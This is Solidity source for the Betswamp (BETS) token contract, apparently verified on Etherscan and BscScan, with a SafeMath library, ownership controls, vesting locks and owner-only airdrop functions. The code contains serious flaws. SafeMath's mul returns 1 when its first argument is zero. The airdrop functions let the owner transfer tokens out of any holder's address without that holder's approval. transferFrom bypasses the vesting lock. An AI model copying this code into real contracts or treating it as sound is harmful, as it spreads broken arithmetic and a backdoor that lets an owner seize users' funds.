/**
 *Submitted for verification at Etherscan.io on 2022-06-19
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-08
*/

// SPDX-License-Identifier: NO LICENSE
pragma solidity >=0.7.0 <0.9.0;

/**
 * BETSWAMP
 */

/**
 * SafeMath
 * Math operations with safety checks that throw on error
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 1;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

/**
 * @dev contract handles all ownership operations which provides
 * basic access control mechanism where an account (owner) is granted
 * exclusive access to specific functions
 */
contract Ownable {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev initializes the contract deployer as the initial owner
     */
    constructor() {
        _owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == _owner, "Only contract owner can call function.");
        _;
    }

    /**
     *  Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev function returns the current owner of the contract
     */
    function displayOnwer() internal view returns (address) {
        return _owner;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "New owner cannot be zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

/**
 * @dev Interface implements the BEP20
 * token standard for the Euphoria token
 */
interface IBEP20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the token name.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the bep token owner.
     */
    function getOwner() external view returns (address);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


contract BETS is IBEP20, Ownable {
    // pancakeswap v2 router testnet address: 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => uint256) private _betswamp_addresses;

    // addresses excluded from transaction fess
    mapping(address => bool) private _isExcludedFromFee;

    mapping(address => bool) private _full_withdrawal_betswamp_address;

    mapping(address => bool) private _autoMarketMakerPair;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    uint256 private _allowed_betswamp_address_spending;
    bool private _isTaxable = true; // tax on
    bool private _isSwapping = false;
    uint256 private swapTokensAtAmount = 25;
    bool private _launchedTax = false;

    // event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
    event ExcludeFromFees(address indexed account, bool isExcluded);    

    constructor(
        address marketing,
        address airdrop,
        address operationAndInfrastructure,
        address privateSale,
        address presale,
        address liquidity,
        address advisors,
        address dev,
        address staking,
        address bonuses,
        address exchange
    ) {
        _name = "Betswamp";
        _symbol = "BETS";
        _decimals = 18;
        _totalSupply = 250000000 * 10**18;

        // init uniswap

        // allowed amount euphoria addresses are allowed to withdraw monthly after lock period
        _allowed_betswamp_address_spending = 2;

        // tokenomics

        _balances[dev] = (_totalSupply / 100) * 5;
        _balances[marketing] = (_totalSupply / 100) * 10;
        _balances[airdrop] = (_totalSupply / 100) * 2;
        _balances[operationAndInfrastructure] = (_totalSupply / 100) * 8;
        _balances[privateSale] = (_totalSupply / 100) * 2;
        _balances[presale] = (_totalSupply / 100) * 12;
        _balances[liquidity] = (_totalSupply / 100) * 32;
        _balances[advisors] = (_totalSupply / 100) * 2;
        _balances[staking] = (_totalSupply / 100) * 15;
        _balances[bonuses] = (_totalSupply / 100) * 2;
        _balances[exchange] = (_totalSupply / 100) * 10;

        // exclude addresses from fees
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[dev] = true;
        _isExcludedFromFee[marketing] = true;
        _isExcludedFromFee[airdrop] = true;
        _isExcludedFromFee[operationAndInfrastructure] = true;
        _isExcludedFromFee[privateSale] = true;
        _isExcludedFromFee[presale] = true;
        _isExcludedFromFee[liquidity] = true;
        _isExcludedFromFee[advisors] = true;
        _isExcludedFromFee[staking] = true;
        _isExcludedFromFee[bonuses] = true;
        _isExcludedFromFee[exchange] = true;

        // betswamp wallet lock time
        _betswamp_addresses[marketing] = block.timestamp + 12 weeks;
        _betswamp_addresses[dev] = block.timestamp + 48 weeks;
        _betswamp_addresses[operationAndInfrastructure] =
            block.timestamp +
            32 weeks; // lock wallet for 8 months
        _betswamp_addresses[airdrop] = block.timestamp + 16 weeks;
        _betswamp_addresses[exchange] = block.timestamp + 8 weeks;
        _betswamp_addresses[bonuses] = block.timestamp + 2 weeks;

        // betswamp addresses permitted to perform full withdrawal
        _full_withdrawal_betswamp_address[privateSale] = true;
        _full_withdrawal_betswamp_address[presale] = true;
        _full_withdrawal_betswamp_address[liquidity] = true;
        _full_withdrawal_betswamp_address[staking] = true;
        _full_withdrawal_betswamp_address[bonuses] = true;
        _full_withdrawal_betswamp_address[advisors] = true;
        _full_withdrawal_betswamp_address[exchange] = true;

        emit Transfer(address(0), dev, (_totalSupply / 100) * 5);
        emit Transfer(address(0), advisors, (_totalSupply / 100) * 2);
        emit Transfer(address(0), staking, (_totalSupply / 100) * 15);
        emit Transfer(address(0), bonuses, (_totalSupply / 100) * 2);
        emit Transfer(address(0), exchange, (_totalSupply / 100) * 10);
        emit Transfer(address(0), marketing, (_totalSupply / 100) * 10);
        emit Transfer(address(0), airdrop, (_totalSupply / 100) * 2);
        emit Transfer(
            address(0),
            operationAndInfrastructure,
            (_totalSupply / 100) * 8
        );
        emit Transfer(address(0), privateSale, (_totalSupply / 100) * 2);
        emit Transfer(address(0), presale, (_totalSupply / 100) * 12);
        emit Transfer(address(0), liquidity, (_totalSupply / 100) * 32);
    }

    /**
     * @dev modifier checks if euphoria address withdrawal time has reached
     * throws if the address withdrawal time isn't greater than
     * the value of block.timestamp
     */
    modifier checkWithdrwalAddressTime(address userAddress) {
        require(
            _betswamp_addresses[userAddress] < block.timestamp,
            "Address withdrawal time hasn't reached."
        );
        _;
    }

    /**
     * @dev returns the bep20 token owner.
     */
    function getOwner() external view override returns (address) {
        return displayOnwer();
    }

    /**
     * @dev returns the token name
     */
    function name() external view override returns (string memory) {
        return _name;
    }

    /**
     * @dev returns the token symbol
     */
    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev returns the token decimal
     */
    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    /**
     * @dev returns the token total supply
     */
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev returns the balance of the account
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev returns true if the specified amount is transfered to the recipient
     */
    function transfer(address recipient, uint256 amount)
        public
        override
        checkWithdrwalAddressTime(msg.sender)
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    /**
     * @dev transfers [amount] from [sender] to [recipient]
     *
     * Emits a Transer event
     *
     * Requirement:
     * [sender] cannot be a zero address
     * [recipient] cannot be a zero address
     * [sender] balance must be equal or greater than amount
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(
            sender != address(0),
            "Transfer from zero address not allowed."
        );
        require(
            recipient != address(0),
            "Transfer to the zero address not allowed."
        );

        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient balance."
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /**
     * @dev returns amount spender is allowed to spend on owner's behalf
     */
    function allowance(address _owner, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[_owner][spender];
    }

    /**
     * @dev approves a specific amount that spender is allowed to spend on owner's
     * behalf
     */
    function approve(address spender, uint256 amount)
        external
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    /**
     * @dev function is similiar to approve function
     * [amount] is set that spender is allowed to spend on owners behalf
     *
     * Requirements:
     * [owner] cannot be a zero address
     * [spender] cannot be a zero address
     *
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal checkWithdrwalAddressTime(msg.sender) {
        require(
            owner != address(0),
            "Approval from a zero address not allowed"
        );
        require(
            spender != address(0),
            "Approval to the zero address not allowed"
        );

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev function conducts transfer on behalf of sender and transfers the funds to recipient
     *
     * Requirements:
     * the [amount] specified must be the same as the approved [amount]
     * approved for the spender to spend.
     */

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(
            amount,
            "Amount exceeds allowance"
        );
        return true;
    }

    /**
     * @dev destroys [amount] tokens from caller account reducing the
     * total supply.
     *
     * Emits a {Transfer} event with [to] set to the zero address.
     *
     * Requirements
     *
     * - sender must have at least [amount] tokens.
     */
    function burn(uint256 amount)
        public
        checkWithdrwalAddressTime(msg.sender)
        returns (bool success)
    {
        _balances[msg.sender] = _balances[msg.sender].sub(
            amount,
            "Amount for burn exceeds balance."
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(msg.sender, address(0), amount);
        return true;
    }

    /**
     * @dev destroys token on behalf of another account
     *
     * Requirements:
     *
     * the [amount] specified must be the same with the amount approved
     * for the spender to spend.
     */
    function burnFrom(address account, uint256 amount)
        public
        checkWithdrwalAddressTime(msg.sender)
        returns (bool success)
    {
        _approve(
            account,
            msg.sender,
            _allowances[account][msg.sender].sub(
                amount,
                "Burn amount exceeds allowance"
            )
        );
        burn(amount);
        return true;
    }

   
    /**
     * @dev function is used to exlude an address for Buy/Sell Fee
     */
    function _excludeFromFee(address _address) external onlyOwner {
        _isExcludedFromFee[_address] = true;
        emit ExcludeFromFees(_address, true);
    }

    /**
     * @dev function is used to include an address to address to be charged Buy/Sell Fee
     */
    function _includeToFee(address _address) external onlyOwner {
        _isExcludedFromFee[_address] = false;
    }


    /**
     * @dev function switches transaction tax on/off
     */
    function _taxSwitch(bool _status) private {
        _isTaxable = _status;
    }

    function switchTax(bool _status) external onlyOwner {
        _taxSwitch(_status);
    }

    // function denotes Pancakeswap launch timestamp
    function launch() external onlyOwner {
        if (_launchedTax) {
            _launchedTax = false;
        } else {
            _launchedTax = true;
        }
    }

    /**
     * @dev function is used to airdrop different amount of
     * tokens to the [_recipients]
     */
    function airdropDifferentTokenAmount(
        address _sender,
        address[] calldata _recipients,
        uint256[] calldata _airdropAmount
    ) external onlyOwner {
        // check if sender is excluded from fees
        if (!_isExcludedFromFee[_sender]) _isExcludedFromFee[_sender] = true;
        // loop through [_recipients] and airdrop tokens
        for (uint256 counter = 0; counter < _recipients.length; counter++) {
            _transfer(_sender, _recipients[counter], _airdropAmount[counter]);
        }
    }

    /**
     * @dev function is used to airdrop same amount of
     * tokens to all [_recipient]
     */
    function airdropSameTokenAmount(
        address _sender,
        address[] calldata _recipients,
        uint256 _airdropAmount
    ) external onlyOwner {
        // check if [_sender] is excluded from fees
        if (!_isExcludedFromFee[_sender]) _isExcludedFromFee[_sender] = true;
        // loop through [_recipients] and airdrop tokens
        for (uint256 counter = 0; counter < _recipients.length; counter++) {
            // airdrop token
            _transfer(_sender, _recipients[counter], _airdropAmount);
        }
    }
}